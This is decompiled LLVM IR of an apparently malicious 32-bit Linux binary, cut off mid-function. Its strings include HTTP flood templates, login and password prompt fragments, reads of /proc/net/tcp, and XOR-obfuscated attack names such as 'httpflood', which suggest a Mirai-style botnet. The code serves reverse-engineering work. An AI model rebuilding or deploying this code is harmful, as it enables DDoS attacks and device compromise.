source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%tms = type { i32, i32, i32, i32 }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%stat = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%linux_dirent64 = type { i32 }

@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_8057170.2 = global i32 0
@global_var_8057188.3 = local_unnamed_addr global i32* @global_var_8057170.2
@global_var_8055494.5 = constant [4 x i8] c"GET\00"
@global_var_805546d.6 = constant i32 1210056751
@global_var_805549f.7 = constant i32 540737568
@global_var_805546f.8 = constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00"
@global_var_8055487.9 = constant [9 x i8] c"\0D\0AHost: \00"
@global_var_80554a6.10 = constant [3 x i8] c"\0D\0A\00"
@global_var_8055498.11 = constant [9 x i8] c"Cookie: \00"
@global_var_80554a1.12 = constant [3 x i8] c"; \00"
@global_var_80554a4.13 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_80554a9.14 = constant i32 1952972859
@global_var_80554ab.15 = constant [5 x i8] c"http\00"
@global_var_80554ba.16 = constant i32 -1623588825
@global_var_80554b0.17 = constant [5 x i8] c"url=\00"
@global_var_80554b5.18 = constant [5 x i8] c"POST\00"
@global_var_80554b3.19 = constant i32 1330643005
@global_var_80554d0.20 = constant [14 x i8] c"/proc/net/tcp\00"
@global_var_80572e4.21 = local_unnamed_addr global i32 0
@global_var_80572e0.22 = local_unnamed_addr global i32 0
@global_var_8057260.23 = local_unnamed_addr global i32 0
@global_var_8057194.24 = local_unnamed_addr global i32 134555728
@global_var_805718c.25 = local_unnamed_addr global i32 -1
@global_var_80572dc.27 = local_unnamed_addr global i32 0
@global_var_80572ec.28 = local_unnamed_addr global i32 0
@global_var_80572ea.29 = local_unnamed_addr global i32 0
@global_var_8057268.30 = local_unnamed_addr global i32 0
@global_var_8057274.31 = local_unnamed_addr global i32 0
@global_var_805726c.32 = local_unnamed_addr global i32 0
@global_var_8057270.33 = local_unnamed_addr global i32 0
@global_var_80572b0.34 = local_unnamed_addr global i32 0
@global_var_805728a.35 = local_unnamed_addr global i32 0
@global_var_8057290.36 = local_unnamed_addr global i32 0
@global_var_8057280.37 = global i32 0
@global_var_8057298.39 = local_unnamed_addr global i32 0
@global_var_80572a4.40 = local_unnamed_addr global i32 0
@global_var_8057294.41 = global i32 0
@global_var_80572fc.42 = local_unnamed_addr global i32 0
@global_var_8057284.43 = local_unnamed_addr global i32 0
@global_var_805728c.44 = local_unnamed_addr global i32 0
@global_var_80572f8.45 = local_unnamed_addr global i32 0
@global_var_80556a5.46 = constant [5 x i8] c"ogin\00"
@global_var_80556aa.47 = constant [6 x i8] c"enter\00"
@global_var_80556b0.48 = constant [8 x i8] c"assword\00"
@global_var_8057278.50 = local_unnamed_addr global i32 0
@global_var_80572a8.51 = local_unnamed_addr global i32 0
@global_var_8057320.52 = global i32 0
@global_var_80556e4.54 = constant [13 x i8] c"RKAGQ@PM\0CVI\22\00"
@global_var_8057338.55 = local_unnamed_addr global i32 0
@global_var_805733c.56 = local_unnamed_addr global i32 0
@global_var_80556f1.57 = constant i32 -1644124382
@global_var_8057340.58 = local_unnamed_addr global i32 0
@global_var_8057344.59 = local_unnamed_addr global i32 0
@global_var_80573b0.60 = local_unnamed_addr global i32 0
@global_var_80573b4.61 = local_unnamed_addr global i32 0
@global_var_80556f4.62 = constant i32 1308659102
@global_var_80573b8.63 = local_unnamed_addr global i32 0
@global_var_80573bc.64 = local_unnamed_addr global i32 0
@global_var_80556f7.65 = constant i32 1448168270
@global_var_8057330.66 = local_unnamed_addr global i32 0
@global_var_8057334.67 = local_unnamed_addr global i32 0
@global_var_8055707.68 = constant i32 1381389898
@global_var_8057348.69 = local_unnamed_addr global i32 0
@global_var_805734c.70 = local_unnamed_addr global i32 0
@global_var_8055725.71 = constant [8 x i8] c"\0DRPMA\0D\22\00"
@global_var_8057350.72 = local_unnamed_addr global i32 0
@global_var_8057354.73 = local_unnamed_addr global i32 0
@global_var_805572d.74 = constant [6 x i8] c"\0DGZG\22\00"
@global_var_8057358.75 = local_unnamed_addr global i32 0
@global_var_805735c.76 = local_unnamed_addr global i32 0
@global_var_8055733.77 = constant i32 1195772418
@global_var_8057360.78 = local_unnamed_addr global i32 0
@global_var_8057364.79 = local_unnamed_addr global i32 0
@global_var_805573f.80 = constant [5 x i8] c"\0DDF\22\00"
@global_var_8057368.81 = local_unnamed_addr global i32 0
@global_var_805736c.82 = local_unnamed_addr global i32 0
@global_var_8055744.83 = constant [8 x i8] c"\0CCLKOG\22\00"
@global_var_8057370.84 = local_unnamed_addr global i32 0
@global_var_8057374.85 = local_unnamed_addr global i32 0
@global_var_805574c.86 = constant [9 x i8] c"\0DQVCVWQ\22\00"
@global_var_8057378.87 = local_unnamed_addr global i32 0
@global_var_805737c.88 = local_unnamed_addr global i32 0
@global_var_8055755.89 = constant i32 1836214128
@global_var_8057380.90 = local_unnamed_addr global i32 0
@global_var_8057384.91 = local_unnamed_addr global i32 0
@global_var_8055763.92 = constant [11 x i8] c"jvvrdnmmf\22\00"
@global_var_8057388.93 = local_unnamed_addr global i32 0
@global_var_805738c.94 = local_unnamed_addr global i32 0
@global_var_805576e.95 = constant [11 x i8] c"nmnlmevdm\22\00"
@global_var_8057390.96 = local_unnamed_addr global i32 0
@global_var_8057394.97 = local_unnamed_addr global i32 0
@global_var_80558ec.98 = constant i32 437738110
@global_var_8057398.99 = local_unnamed_addr global i32 0
@global_var_805739c.100 = local_unnamed_addr global i32 0
@global_var_8055779.101 = constant [9 x i8] c"XMNNCPF\22\00"
@global_var_80573a0.102 = local_unnamed_addr global i32 0
@global_var_80573a4.103 = local_unnamed_addr global i32 0
@global_var_8055782.104 = constant [12 x i8] c"egvnmacnkr\22\00"
@global_var_80573a8.105 = local_unnamed_addr global i32 0
@global_var_80573ac.106 = local_unnamed_addr global i32 0
@global_var_805578e.107 = constant [7 x i8] c"QJGNN\22\00"
@global_var_80573c0.108 = local_unnamed_addr global i32 0
@global_var_80573c4.109 = local_unnamed_addr global i32 0
@global_var_8055795.110 = constant [8 x i8] c"GLC@NG\22\00"
@global_var_80573c8.111 = local_unnamed_addr global i32 0
@global_var_80573cc.112 = local_unnamed_addr global i32 0
@global_var_805579d.113 = constant [8 x i8] c"Q[QVGO\22\00"
@global_var_80573d0.114 = local_unnamed_addr global i32 0
@global_var_80573d4.115 = local_unnamed_addr global i32 0
@global_var_80557a5.116 = constant [4 x i8] c"QJ\22\00"
@global_var_80573d8.117 = local_unnamed_addr global i32 0
@global_var_80573dc.118 = local_unnamed_addr global i32 0
@global_var_80557a9.119 = constant i32 1280000013
@global_var_80573e0.120 = local_unnamed_addr global i32 0
@global_var_80573e4.121 = local_unnamed_addr global i32 0
@global_var_80557bd.122 = constant i32 1668311919
@global_var_80573e8.123 = local_unnamed_addr global i32 0
@global_var_80573ec.124 = local_unnamed_addr global i32 0
@global_var_80557d6.125 = constant [10 x i8] c"LAMPPGAV\22\00"
@global_var_80573f0.126 = local_unnamed_addr global i32 0
@global_var_80573f4.127 = local_unnamed_addr global i32 0
@global_var_80557e0.128 = constant i32 1280000013
@global_var_80573f8.129 = local_unnamed_addr global i32 0
@global_var_80573fc.130 = local_unnamed_addr global i32 0
@global_var_80557f1.131 = constant i32 1280000013
@global_var_8057400.132 = local_unnamed_addr global i32 0
@global_var_8057404.133 = local_unnamed_addr global i32 0
@global_var_8055808.134 = constant i32 1464693110
@global_var_8057408.135 = local_unnamed_addr global i32 0
@global_var_805740c.136 = local_unnamed_addr global i32 0
@global_var_805581e.137 = constant [18 x i8] c"\0DGVA\0DPGQMNT\0CAMLD\22\00"
@global_var_8057410.138 = local_unnamed_addr global i32 0
@global_var_8057414.139 = local_unnamed_addr global i32 0
@global_var_8055830.140 = constant i32 1196376908
@global_var_8057418.141 = local_unnamed_addr global i32 0
@global_var_805741c.142 = local_unnamed_addr global i32 0
@global_var_805583d.143 = constant i32 1280068961
@global_var_8057420.144 = local_unnamed_addr global i32 0
@global_var_8057424.145 = local_unnamed_addr global i32 0
@global_var_8055910.146 = constant i32 1195458915
@global_var_8057428.147 = local_unnamed_addr global i32 0
@global_var_805742c.148 = local_unnamed_addr global i32 0
@global_var_8055964.149 = constant i32 1195458915
@global_var_8057430.150 = local_unnamed_addr global i32 0
@global_var_8057434.151 = local_unnamed_addr global i32 0
@global_var_8055988.152 = constant i32 1447841121
@global_var_8057438.153 = local_unnamed_addr global i32 0
@global_var_805743c.154 = local_unnamed_addr global i32 0
@global_var_8055855.155 = constant i32 1633044305
@global_var_8057440.156 = local_unnamed_addr global i32 0
@global_var_8057444.157 = local_unnamed_addr global i32 0
@global_var_8055862.158 = constant i32 1346651984
@global_var_8057448.159 = local_unnamed_addr global i32 0
@global_var_805744c.160 = local_unnamed_addr global i32 0
@global_var_805586c.161 = constant i32 1128353102
@global_var_8057450.162 = local_unnamed_addr global i32 0
@global_var_8057454.163 = local_unnamed_addr global i32 0
@global_var_8055877.164 = constant i32 257312593
@global_var_8057458.165 = local_unnamed_addr global i32 0
@global_var_805745c.166 = local_unnamed_addr global i32 0
@global_var_8055884.167 = constant i32 1447841089
@global_var_8057460.168 = local_unnamed_addr global i32 0
@global_var_8057464.169 = local_unnamed_addr global i32 0
@global_var_8055895.170 = constant i32 1279479894
@global_var_8057468.171 = local_unnamed_addr global i32 0
@global_var_805746c.172 = local_unnamed_addr global i32 0
@global_var_80558a9.173 = constant [9 x i8] c"AJWLIGF\22\00"
@global_var_8057470.174 = local_unnamed_addr global i32 0
@global_var_8057474.175 = local_unnamed_addr global i32 0
@global_var_8055849.176 = constant i32 1380403017
@global_var_8057478.177 = local_unnamed_addr global i32 0
@global_var_805747c.178 = local_unnamed_addr global i32 0
@global_var_80558b2.179 = constant i32 1280068929
@global_var_8057480.180 = local_unnamed_addr global i32 0
@global_var_8057484.181 = local_unnamed_addr global i32 0
@global_var_80558bf.182 = constant i32 1414547281
@global_var_8057488.183 = local_unnamed_addr global i32 0
@global_var_805748c.184 = local_unnamed_addr global i32 0
@global_var_80558d2.185 = constant i32 1414547281
@global_var_8057490.186 = local_unnamed_addr global i32 0
@global_var_8057494.187 = local_unnamed_addr global i32 0
@global_var_80559bc.188 = constant i32 1264078191
@global_var_8057498.189 = local_unnamed_addr global i32 0
@global_var_805749c.190 = local_unnamed_addr global i32 0
@global_var_8055a2c.191 = constant i32 1264078191
@global_var_80574a0.192 = local_unnamed_addr global i32 0
@global_var_80574a4.193 = local_unnamed_addr global i32 0
@global_var_8055a9c.194 = constant i32 1264078191
@global_var_80574a8.195 = local_unnamed_addr global i32 0
@global_var_80574ac.196 = local_unnamed_addr global i32 0
@global_var_8055b0c.197 = constant i32 1264078191
@global_var_80574b0.198 = local_unnamed_addr global i32 0
@global_var_80574b4.199 = local_unnamed_addr global i32 0
@global_var_8055b7c.200 = constant i32 1264078191
@global_var_80574b8.201 = local_unnamed_addr global i32 0
@global_var_80574bc.202 = local_unnamed_addr global i32 0
@global_var_80572d4.203 = global i32 0
@global_var_80574c0.204 = global i32 0
@global_var_80571a0.205 = global i32 0
@global_var_805756c.207 = global i32 0
@global_var_8057570.208 = local_unnamed_addr global i32 0
@global_var_8057574.209 = global i32 0
@global_var_8057580.210 = local_unnamed_addr global i32 0
@global_var_8057874.211 = global i32 0
@global_var_805789c.212 = local_unnamed_addr global i32 0
@global_var_805788c.213 = local_unnamed_addr global i32 0
@global_var_8057890.214 = local_unnamed_addr global i32 0
@global_var_8057894.215 = local_unnamed_addr global i32 0
@global_var_8057898.216 = local_unnamed_addr global i32 0
@global_var_80578a4.217 = local_unnamed_addr global i32 0
@global_var_80578b0.218 = local_unnamed_addr global i32 0
@global_var_80578a8.219 = local_unnamed_addr global i32 0
@global_var_80578b4.220 = local_unnamed_addr global i32 0
@global_var_8057888.221 = local_unnamed_addr global i32 0
@global_var_8057884.223 = local_unnamed_addr global i32 0
@global_var_80578ac.224 = local_unnamed_addr global i32 0
@global_var_805757c.225 = local_unnamed_addr global i32 0
@global_var_80571b8.226 = global i32 0
@global_var_8055f60.228 = constant i32 33554944
@global_var_80571ec.229 = local_unnamed_addr global i32* @global_var_8055f60.228
@global_var_80571d0.230 = global i32 0
@global_var_80572b8.231 = local_unnamed_addr global i32 0
@global_var_8057164.233 = global i32 -1
@global_var_8054a19.234 = constant i32 -294069
@global_var_80572c8.235 = local_unnamed_addr global i32 0
@global_var_80572cc.236 = local_unnamed_addr global i32 0
@global_var_8055e4c.237 = constant [10 x i8] c"/dev/null\00"
@global_var_80572c4.239 = local_unnamed_addr global i32 0
@global_var_80572bc.240 = local_unnamed_addr global i32 0
@global_var_80572c0.241 = local_unnamed_addr global i32 0
@global_var_80554a8.242 = constant i32 1744845568
@global_var_80571e8.243 = local_unnamed_addr global i32* @global_var_80554a8.242
@global_var_8054bff.244 = constant i32 1928542531
@global_var_8054c23.245 = constant i32 1928542531
@global_var_80572d8.246 = local_unnamed_addr global i32 0
@global_var_80578b8.247 = local_unnamed_addr global i32 0
@global_var_80578bc.248 = local_unnamed_addr global i32 0
@global_var_8057200.1 = local_unnamed_addr global i8 0
@global_var_8057198.26 = local_unnamed_addr global i8 1
@global_var_8057296.38 = local_unnamed_addr global i16 0
@global_var_80572ac.49 = local_unnamed_addr global i16 0
@global_var_805719c.53 = local_unnamed_addr global i16 -16657
@global_var_8057540.206 = global i8 0
@global_var_80578a0.222 = local_unnamed_addr global i8 0
@global_var_80572b4.227 = local_unnamed_addr global i8 0
@global_var_80572d0.238 = local_unnamed_addr global i8 0

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8048094() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @function_80480b0(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 61659
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @function_8048110()
  %v0_80480a8 = call i32 @function_8055420()
  ret i32 %v0_80480a8
}

define i32 @function_80480b0(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @function_80480c0() local_unnamed_addr {
dec_label_pc_80480c0:
  %v0_80480c6 = load i8, i8* @global_var_8057200.1, align 512
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge

dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge: ; preds = %dec_label_pc_80480c0
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %dec_label_pc_80480c0
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_8057188.3 to i32*), align 8
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e44 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e44, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_8057188.3 to i32*), align 8
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_8057188.3 to i32*), align 8
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_8057200.1, align 512
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8057188.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_8057200.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @function_8048110() local_unnamed_addr {
dec_label_pc_8048110:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 134570336)
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_8048140 = load i32, i32* inttoptr (i32 134574452 to i32*), align 4
  %v1_8048145 = icmp eq i32 %v0_8048140, 0
  br i1 %v1_8048145, label %dec_label_pc_804815f, label %dec_label_pc_8048149

dec_label_pc_8048149:                             ; preds = %dec_label_pc_8048140
  br label %dec_label_pc_804815f

dec_label_pc_804815f:                             ; preds = %dec_label_pc_8048149, %dec_label_pc_8048140
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @entry_point(i8 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20900 = alloca i8*, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-20825 = alloca i32, align 4
  %stack_var_-20972 = alloca i32, align 4
  %stack_var_-20956 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v3_8048166 = sext i8 %arg1 to i32
  store i32 %v3_8048166, i32* @esi, align 4
  %v5_8048166 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v5_8048166, i32* @ecx, align 4
  %v2_8048169 = icmp ult i32* %stack_var_4, inttoptr (i32 16 to i32*)
  store i1 %v2_8048169, i1* %zf.global-to-local, align 1
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %v11_8048180 = call i32 @function_8054ab5(i32 134541152, i32 %v3_8048166, i32* nonnull %stack_var_4, i32 -108, i32 134566982, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  %v0_8048191 = load i32, i32* @edi, align 4
  %v0_8048192 = load i32, i32* @esi, align 4
  %v0_8048193 = load i32, i32* @ebx, align 4
  %v15_8048194 = ptrtoint i32* %stack_var_-20956 to i32
  store i32 134566982, i32* @ebx, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  store i32 148, i32* %eax.global-to-local, align 4
  store i32 %v3_8048166, i32* @ebp, align 4
  store i32 148, i32* @esi, align 4
  store i32 148, i32* %stack_var_-20972, align 4
  %v5_80481bd = call i32 @function_804a0a0(i8 -108, i32 134566982, i32 21, i32 0)
  store i32 %v5_80481bd, i32* %eax.global-to-local, align 4
  %v0_80481cd = load i32, i32* @ebx, align 4
  %v0_80481ce = load i32, i32* @esi, align 4
  %v5_80481cf = trunc i32 %v0_80481ce to i8
  %v6_80481cf = call i32 @function_804a0a0(i8 %v5_80481cf, i32 %v0_80481cd, i32 20, i32 ptrtoint ([4 x i8]* @global_var_8055494.5 to i32))
  store i32 %v6_80481cf, i32* %eax.global-to-local, align 4
  %tmp136 = bitcast i8** %stack_var_-20900 to i32*
  store i32 %v6_80481cf, i32* %tmp136, align 4
  %v0_80481d8 = load i32, i32* @esp, align 4
  %v6_80481d8 = icmp eq i32 %v0_80481d8, -32
  store i1 %v6_80481d8, i1* %zf.global-to-local, align 1
  %v0_80481df = load i32, i32* @ebx, align 4
  %v0_80481e0 = load i32, i32* @esi, align 4
  store i32 %v0_80481e0, i32* %stack_var_-20972, align 4
  %v4_80481e1 = trunc i32 %v0_80481e0 to i8
  %v5_80481e1 = call i32 @function_804a0a0(i8 %v4_80481e1, i32 %v0_80481df, i32 8, i32 0)
  store i32 %v5_80481e1, i32* %eax.global-to-local, align 4
  %v0_80481f1 = load i32, i32* @ebx, align 4
  %v0_80481f2 = load i32, i32* @esi, align 4
  %v5_80481f3 = trunc i32 %v0_80481f2 to i8
  %v6_80481f3 = call i32 @function_804a0a0(i8 %v5_80481f3, i32 %v0_80481f1, i32 22, i32 ptrtoint (i32* @global_var_805546d.6 to i32))
  store i32 %v6_80481f3, i32* @eax, align 4
  %v0_80481fc = load i32, i32* @esp, align 4
  %v6_80481fc = icmp eq i32 %v0_80481fc, -32
  store i1 %v6_80481fc, i1* %zf.global-to-local, align 1
  %v0_8048203 = load i32, i32* @ebx, align 4
  %v0_8048204 = load i32, i32* @esi, align 4
  store i32 %v0_8048204, i32* %stack_var_-20972, align 4
  %v4_8048205 = trunc i32 %v0_8048204 to i8
  %v5_8048205 = call i32 @function_804a600(i8 %v4_8048205, i32 %v0_8048203, i32 24, i32 1)
  store i32 %v5_8048205, i32* @eax, align 4
  store i32 %v5_8048205, i32* @edi, align 4
  %v0_8048210 = load i32, i32* @ebx, align 4
  %v0_8048211 = load i32, i32* @esi, align 4
  %v5_8048212 = trunc i32 %v0_8048211 to i8
  %v6_8048212 = call i32 @function_804a600(i8 %v5_8048212, i32 %v0_8048210, i32 7, i32 80)
  store i32 %v6_8048212, i32* %eax.global-to-local, align 4
  %v0_804821c = load i32, i32* @esp, align 4
  %v9_804821c = icmp eq i32 %v0_804821c, -28
  store i1 %v9_804821c, i1* %zf.global-to-local, align 1
  %v2_8048226 = ptrtoint i32* %stack_var_-20825 to i32
  store i32 %v2_8048226, i32* %edx.global-to-local, align 4
  store i32 %v2_8048226, i32* %stack_var_-20972, align 4
  %v3_804822e = bitcast i32* %stack_var_-20825 to i8*
  %v4_804822e = call i32 @function_805310a(i8* %v3_804822e, i32 0, i32 10241)
  store i32 %v4_804822e, i32* %eax.global-to-local, align 4
  store i32 %v5_80481e1, i32* %ecx.global-to-local, align 4
  %v1_804823a = icmp eq i32 %v5_80481e1, 0
  store i1 %v1_804823a, i1* %zf.global-to-local, align 1
  %tmp238 = inttoptr i32 %v6_80481cf to i8*
  br i1 %v1_804823a, label %dec_label_pc_804825d, label %dec_label_pc_804823e

dec_label_pc_804823e:                             ; preds = %entry
  store i32 %v6_80481f3, i32* %edx.global-to-local, align 4
  %v1_8048242 = icmp eq i32 %v6_80481f3, 0
  store i1 %v1_8048242, i1* %zf.global-to-local, align 1
  br i1 %v1_8048242, label %dec_label_pc_804825d, label %dec_label_pc_8048246

dec_label_pc_8048246:                             ; preds = %dec_label_pc_804823e
  %v9_8048246 = icmp eq i32* %stack_var_-20956, inttoptr (i32 12 to i32*)
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 %v6_80481f3, i32* %eax.global-to-local, align 4
  store i32 %v6_80481f3, i32* %stack_var_-20972, align 4
  %v1_804824e = inttoptr i32 %v6_80481f3 to i8*
  %v2_804824e = call i32 @function_80525e0(i8* %v1_804824e)
  store i32 %v2_804824e, i32* %eax.global-to-local, align 4
  %v10_8048256 = icmp eq i32 %v2_804824e, 255
  store i1 %v10_8048256, i1* %zf.global-to-local, align 1
  %v7_804825b = icmp sgt i32 %v2_804824e, 255
  br i1 %v7_804825b, label %dec_label_pc_804825d, label %dec_label_pc_8048268

dec_label_pc_804825d:                             ; preds = %dec_label_pc_8048246, %dec_label_pc_804827d, %dec_label_pc_8048268, %dec_label_pc_804823e, %entry
  %v0_8048267 = phi i32 [ %v2_804824e, %dec_label_pc_8048246 ], [ %v2_8048285, %dec_label_pc_804827d ], [ %v2_8048270, %dec_label_pc_8048268 ], [ %v4_804822e, %dec_label_pc_804823e ], [ %v4_804822e, %entry ]
  %v9_804825d = icmp eq i32* %stack_var_-20956, inttoptr (i32 -20908 to i32*)
  store i1 %v9_804825d, i1* %zf.global-to-local, align 1
  store i32 %v0_8048193, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %v0_8048192, 16777216
  %v3_8048264 = sdiv i32 %sext, 16777216
  store i32 %v3_8048264, i32* %esi.global-to-local, align 4
  store i32 %v0_8048191, i32* %edi.global-to-local, align 4
  ret i32 %v0_8048267

dec_label_pc_8048268:                             ; preds = %dec_label_pc_8048246
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 %v5_80481e1, i32* %eax.global-to-local, align 4
  store i32 %v5_80481e1, i32* %stack_var_-20972, align 4
  %v1_8048270 = inttoptr i32 %v5_80481e1 to i8*
  %v2_8048270 = call i32 @function_80525e0(i8* %v1_8048270)
  store i32 %v2_8048270, i32* %eax.global-to-local, align 4
  %v1_8048278 = add i32 %v2_8048270, -127
  %v6_8048278 = sub i32 126, %v2_8048270
  %v7_8048278 = and i32 %v6_8048278, %v2_8048270
  %v8_8048278 = icmp slt i32 %v7_8048278, 0
  %v9_8048278 = icmp eq i32 %v1_8048278, 0
  store i1 %v9_8048278, i1* %zf.global-to-local, align 1
  %v10_8048278 = icmp slt i32 %v1_8048278, 0
  %v3_804827b = icmp eq i1 %v10_8048278, %v8_8048278
  %v4_804827b = icmp eq i1 %v9_8048278, false
  %v5_804827b = and i1 %v4_804827b, %v3_804827b
  br i1 %v5_804827b, label %dec_label_pc_804825d, label %dec_label_pc_804827d

dec_label_pc_804827d:                             ; preds = %dec_label_pc_8048268
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 %v6_80481cf, i32* %eax.global-to-local, align 4
  store i32 %v6_80481cf, i32* %stack_var_-20972, align 4
  %v2_8048285 = call i32 @function_80525e0(i8* %tmp238)
  store i32 %v2_8048285, i32* %eax.global-to-local, align 4
  %v1_804828d = add i32 %v2_8048285, -9
  %v6_804828d = sub i32 8, %v2_8048285
  %v7_804828d = and i32 %v6_804828d, %v2_8048285
  %v8_804828d = icmp slt i32 %v7_804828d, 0
  %v9_804828d = icmp eq i32 %v1_804828d, 0
  store i1 %v9_804828d, i1* %zf.global-to-local, align 1
  %v10_804828d = icmp slt i32 %v1_804828d, 0
  %v3_8048290 = icmp eq i1 %v10_804828d, %v8_804828d
  %v4_8048290 = icmp eq i1 %v9_804828d, false
  %v5_8048290 = and i1 %v4_8048290, %v3_8048290
  br i1 %v5_8048290, label %dec_label_pc_804825d, label %dec_label_pc_804829d.preheader

dec_label_pc_804829d.preheader:                   ; preds = %dec_label_pc_804827d
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 %v6_80481cf, i32* %eax.global-to-local, align 4
  store i32 %v6_80481cf, i32* %stack_var_-20972, align 4
  %v2_80482a5212 = call i32 @function_80525e0(i8* %tmp238)
  store i32 %v2_80482a5212, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v12_80482b4213 = icmp eq i32 %v2_80482a5212, 0
  store i1 %v12_80482b4213, i1* %zf.global-to-local, align 1
  %v7_80482b6214 = icmp sgt i32 %v2_80482a5212, 0
  br i1 %v7_80482b6214, label %dec_label_pc_80482b8, label %dec_label_pc_80482dd

dec_label_pc_80482b8:                             ; preds = %dec_label_pc_804829d.preheader, %dec_label_pc_80482cc
  %v4_80482a0217 = phi i32 [ %v4_80482a0, %dec_label_pc_80482cc ], [ %v6_80481cf, %dec_label_pc_804829d.preheader ]
